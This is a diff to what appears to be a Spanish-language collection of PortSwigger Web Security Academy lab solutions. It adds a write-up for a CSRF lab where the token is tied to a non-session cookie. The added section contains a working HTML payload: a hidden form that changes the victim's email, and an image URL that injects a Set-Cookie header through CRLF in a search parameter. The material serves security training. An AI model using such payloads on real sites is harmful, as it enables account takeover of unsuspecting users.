@@ -447,6 +447,20 @@ Para resolver este laboratorio, completar lo siguiente con la url del mismo, y e
 </script>
 ```
 
+### [CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
+
+Caso muy similar al anterior, pero se explota la falta de protección csrf en la función de búsqueda para inyetar cookies en el navegaror de la víctima
+
+#### Solución:
+
+```html
+<form method="POST" action="https://ac0f1f011f77ebbc80c6239100e400e0.web-security-academy.net/email/change-email">
+     <input type="hidden" name="email" value="algo@mail.com">
+     <input type="hidden" name="csrf" value="AC99lyKRB1kwqqNclxVT71NsvOYkhcjv">
+</form>
+<img src="/?search=test%0d%0aSet-Cookie:%20csrfKey=bPn9hLl0tvfI5hmsh7vnKuFh0auOpLjP" onerror="document.forms[0].submit()">
+```
+
 ---
 
 ## [Clickjacking](https://portswigger.net/web-security/clickjacking)
